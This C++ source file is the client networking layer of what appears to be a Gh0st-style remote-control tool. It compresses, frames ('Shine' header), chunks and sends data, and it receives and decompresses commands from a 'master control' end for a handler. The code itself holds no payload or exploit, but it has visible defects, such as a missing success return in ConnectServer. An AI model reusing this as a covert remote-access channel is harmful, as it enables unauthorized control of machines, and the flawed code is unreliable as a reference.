#include "pch.h"
#include "IocpClient.h"
int CIocpClient::OnSending(char* BufferData, ULONG BufferLength)
{
	m_SendCompressedBufferData.ClearArray();

	if (BufferLength > 0)
	{
		//有13个字节是不参与压缩的    
		unsigned long	CompressedLength = (double)BufferLength * 1.001 + 12;   //100 * 1.001 + 12
		LPBYTE			CompressedData = new BYTE[CompressedLength];   //动态申请内存

		if (CompressedData == NULL)
		{
			return 0;
		}
		//微软的官方类库
		int	IsOk = compress(CompressedData, &CompressedLength, (PBYTE)BufferData, BufferLength);

		if (IsOk != Z_OK)
		{
			//数据压缩失败
			delete[] CompressedData;   //销毁内存
			return FALSE;
		}

		//计算数据包总长
		ULONG PackTotalLength = CompressedLength + PACKET_HEADER_LENGTH;
		m_SendCompressedBufferData.WriteArray((PBYTE)m_PacketHeaderFlag, sizeof(m_PacketHeaderFlag));
		//Shine
		m_SendCompressedBufferData.WriteArray((PBYTE)&PackTotalLength, sizeof(ULONG));
		//ShinePackTotalLength
		m_SendCompressedBufferData.WriteArray((PBYTE)&BufferLength, sizeof(ULONG));
		//ShinePackTotalLengthBufferLength
		m_SendCompressedBufferData.WriteArray(CompressedData, CompressedLength);
		//[Shine][PackTotalLength][BufferLength][........(压缩后的真实数据)]

		delete[] CompressedData;   //销毁内存
		CompressedData = NULL;

	}

	//分段发送数据
	return SendWithSplit((char*)m_SendCompressedBufferData.GetArray(),
		m_SendCompressedBufferData.GetArrayLength(),
		MAX_SEND_BUFFER);
}
//切割发送
BOOL CIocpClient::SendWithSplit(char* BufferData, ULONG BufferLength, ULONG SplitLength)
{
	int			 ReturnLength = 0;
	const char* Travel = (char*)BufferData;
	int			 i = 0;
	ULONG		 Sended = 0;
	ULONG		 SendRetry = 15;
	int          j = 0;

	for (i = BufferLength; i >= SplitLength; i -= SplitLength)
	{
		for (j = 0; j < SendRetry; j++)  //确保数据每次能够成功 对每一段数据的15次发送
		{
			ReturnLength = send(m_ClientSocket, Travel, SplitLength, 0);   //同步函数
			if (ReturnLength > 0)
			{
				break;//发送成功 退出该段数据的发送
			}
		}
		if (j == SendRetry)
		{
			return FALSE;   //完犊子
		}

		Sended += SplitLength;
		Travel += ReturnLength;
		Sleep(15);
	}
	//0x9000  0x2000   2000 2000 2000 2000 1000
	if (i > 0)
	{
		for (int j = 0; j < SendRetry; j++)
		{
			ReturnLength = send(m_ClientSocket, (char*)Travel, i, 0);

			Sleep(15);
			if (ReturnLength > 0)
			{
				break;
			}
		}
		if (j == SendRetry)
		{
			return FALSE;
		}
		Sended += ReturnLength;
	}
	if (Sended == BufferLength)
	{
		return TRUE;   //整个数据发送完毕
	}
	else
	{
		return FALSE;
	}
}

CIocpClient::CIocpClient()
{
	//初始化套接字类库
	WSADATA v1;
	if (WSAStartup(MAKEWORD(2, 2), &v1) != 0)
	{
		return;
	}

	//通信套接字
	m_ClientSocket = INVALID_SOCKET;
	memcpy(m_PacketHeaderFlag, "Shine", PACKET_FLAG_LENGTH);
	m_WorkThreadHandle = NULL;
	m_EventHandle = CreateEvent(NULL, TRUE, FALSE, NULL);
}

CIocpClient::~CIocpClient()
{

	if (m_ClientSocket != INVALID_SOCKET)
	{
		closesocket(m_ClientSocket);
		m_ClientSocket = INVALID_SOCKET;
	}

	//关闭工作线程句柄
	if (m_WorkThreadHandle != NULL)
	{
		CloseHandle(m_WorkThreadHandle);
		m_WorkThreadHandle = NULL;
	}
	//关闭事件
	if (m_EventHandle != NULL)
	{
		CloseHandle(m_EventHandle);
		m_EventHandle = NULL;
	}


	WSACleanup();
}
BOOL CIocpClient::ConnectServer(char* ServerAddress, unsigned short ConnectPort)
{
	//生成一个通信套接字
	m_ClientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (m_ClientSocket == SOCKET_ERROR)
	{
		return FALSE;
	}
	//构造sockaddr_in结构也就是Server的IPAddress结构
	//初始化服务器网卡
	sockaddr_in	v1;
	v1.sin_family = AF_INET;
	v1.sin_port = htons(ConnectPort);
 	v1.sin_addr.S_un.S_addr = inet_addr(ServerAddress);
	//链接服务器
  	if (connect(m_ClientSocket, (SOCKADDR*)&v1, sizeof(sockaddr_in)) == SOCKET_ERROR)
	{
		int LastError = WSAGetLastError();
		if (m_ClientSocket != INVALID_SOCKET)
		{
 			closesocket(m_ClientSocket);
			m_ClientSocket = INVALID_SOCKET;
		}
		return FALSE;
	}

	//服务器到客户端的数据
		m_WorkThreadHandle = (HANDLE)CreateThread(NULL, 0,
			(LPTHREAD_START_ROUTINE)WorkThreadProcedure, (LPVOID)this, 0, NULL);   //接收数据

}
VOID CIocpClient::Disconnect()
{
	CancelIo((HANDLE)m_ClientSocket);           //取消当前对象上曾经没有完成的异步IO请求
	InterlockedExchange((LPLONG)&m_IsReceiving, FALSE);   //通知工作线程退出的信号
	closesocket(m_ClientSocket);                          //会触发对方接收-1数据
	SetEvent(m_EventHandle);       //
	m_ClientSocket = INVALID_SOCKET;
}
DWORD WINAPI CIocpClient::WorkThreadProcedure(LPVOID ParameterData)
{
	CIocpClient* v1 = (CIocpClient*)ParameterData;
	//通信模型：选择模型

	//定义套接字集合
	fd_set OldSocketSet;
	fd_set NewSocketSet;
	FD_ZERO(&OldSocketSet);
	FD_ZERO(&NewSocketSet);
	//接收数据内存
	char BufferData[PACKET_LENGTH] = { 0 };

	//将上线通信套接字放入到集合中
	FD_SET(v1->m_ClientSocket, &OldSocketSet);

	while (v1->IsReceiving())
	{
		NewSocketSet = OldSocketSet; 
		//服务器如果没有数据发送给客户端将阻塞在select函数中
		int IsOk = select(NULL, &NewSocketSet, NULL, NULL, NULL);   //阻塞函数（如果没有任何信号，代码不会向下执行）

		if (IsOk == SOCKET_ERROR)   //函数发生错误
		{
			v1->Disconnect();
			_tprintf(_T("IsReceiving关闭\r\n"));
			break;

		}
		if (IsOk > 0)
		{
			//套接字集合中的套接字得到了授信 数据到达
			memset(BufferData, 0, sizeof(BufferData));
			//接收主控端发来的数据
			int BufferLength = recv(v1->m_ClientSocket, BufferData, sizeof(BufferData), 0);
			if (BufferLength <= 0)      //一旦服务器关闭套接字 就会收到0长度的BufferLength
			{
				_tprintf(_T("WorkThreadProcedure(接收数据）：主控端关闭我了\r\n"));
				v1->Disconnect();
				break;

			}
			if (BufferLength > 0)
			{
				v1->OnReceiving((char*)BufferData, BufferLength);   //解析数据
			}
		}
	}
	return 0;
}
VOID CIocpClient::OnReceiving(char* BufferData, ULONG BufferLength)
{
	//接到的数据进行解压缩
	try
	{
		if (BufferLength == 0)
		{
			Disconnect();       //错误处理
			return;
		}
		//将接收到的数据存储到m_ReceivedCompressedBufferData
		m_ReceivedCompressedBufferData.WriteArray((LPBYTE)BufferData, BufferLength);

		//检测数据是否大于数据头大小如果不是那就不是正确的数据
		while (m_ReceivedCompressedBufferData.GetArrayLength() > PACKET_HEADER_LENGTH)
		{
			char v1[PACKET_FLAG_LENGTH] = { 0 };
			CopyMemory(v1, m_ReceivedCompressedBufferData.GetArray(), PACKET_FLAG_LENGTH);
			//判断数据头
			if (memcmp(m_PacketHeaderFlag, v1, PACKET_FLAG_LENGTH) != 0)
			{
				throw "Bad Buffer";
			}

			ULONG PackTotalLength = 0;
			CopyMemory(&PackTotalLength, m_ReceivedCompressedBufferData.GetArray(PACKET_FLAG_LENGTH),
				sizeof(ULONG));

			//数据的大小正确判断
			if (PackTotalLength &&
				(m_ReceivedCompressedBufferData.GetArrayLength()) >= PackTotalLength)
			{


				m_ReceivedCompressedBufferData.ReadArray((PBYTE)v1, PACKET_FLAG_LENGTH);

				m_ReceivedCompressedBufferData.ReadArray((PBYTE)&PackTotalLength, sizeof(ULONG));

				ULONG DecompressedLength = 0;
				m_ReceivedCompressedBufferData.ReadArray((PBYTE)&DecompressedLength, sizeof(ULONG));


				ULONG CompressedLength = PackTotalLength - PACKET_HEADER_LENGTH;
				PBYTE CompressedData = new BYTE[CompressedLength];
				PBYTE DecompressedData = new BYTE[DecompressedLength];


				if (CompressedData == NULL || DecompressedData == NULL)
				{
					throw "Bad Allocate";

				}

				m_ReceivedCompressedBufferData.ReadArray(CompressedData, CompressedLength);
				int	IsOk = uncompress(DecompressedData,
					&DecompressedLength, CompressedData, CompressedLength);


				if (IsOk == Z_OK)//如果解压成功
				{
					m_ReceivedDecompressedBufferData.ClearArray();
					m_ReceivedDecompressedBufferData.WriteArray(DecompressedData,
						DecompressedLength);


					delete[] CompressedData;
					delete[] DecompressedData;



					//MessageBox(NULL, 0, 0, 0);
					//虚拟多态
					m_Manager->HandleIo((PBYTE)m_ReceivedDecompressedBufferData.GetArray(0),
						m_ReceivedDecompressedBufferData.GetArrayLength());
				}
				else
				{
					delete[] CompressedData;
					delete[] DecompressedData;
					throw "Bad Buffer";
				}

			}
			else
				break;
		}
	}
	catch (...)
	{
		m_ReceivedCompressedBufferData.ClearArray();
		m_ReceivedDecompressedBufferData.ClearArray();
	}




}